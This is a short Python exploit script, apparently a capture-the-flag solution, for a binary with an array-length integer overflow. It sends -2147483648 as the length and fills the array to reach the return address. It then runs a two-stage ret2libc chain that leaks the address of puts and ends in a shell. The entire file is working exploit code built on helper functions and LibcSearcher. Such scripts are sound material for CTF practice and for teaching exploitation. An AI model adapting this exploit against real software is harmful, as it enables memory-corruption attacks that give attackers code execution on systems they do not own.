from helper import *
from helper.exp import ret2libc_A, ret2libc_B
import re
import ctypes
from LibcSearcher import *

# fill array and ebp
def fill_array(content):
    ru("choice:\n")
    sl(1)
    sl(content)

def from_main():
    # 0x44 + 4 + ret
    ru("length of array:")
    sl("-2147483648")   # -2^31 -> 

    for i in range(10):
        fill_array(0x1111)

    fill_array(0x1ead)
    fill_array(0x1ead)
    fill_array(0xc)
    for i in range(5):
        fill_array(0x2222)


from_main()
payload = ret2libc_A("puts", elf.sym['main'], b"")

for bytes32 in re.findall(b"....", payload):
    sl(1); sl(u32(bytes32))

sl(4)
leaked = leak()
info(hex(leaked))
io.sendline()


# libcs = LibcSearcher("puts", leaked)
# libcs.select_libc()

# TODO 添加对LibcSearcher的支持
# https://github.com/dev2ero/LibcSearcher
from_main()
payload = ret2libc_B('puts', leaked, elf.libc, b"")
# pause()
for bytes32 in re.findall(b"....", payload):
    sl(b"1")
    num = u32(bytes32) 
    num = ctypes.c_int32(num).value
    sl(str(num))
sl(b'4')
shell()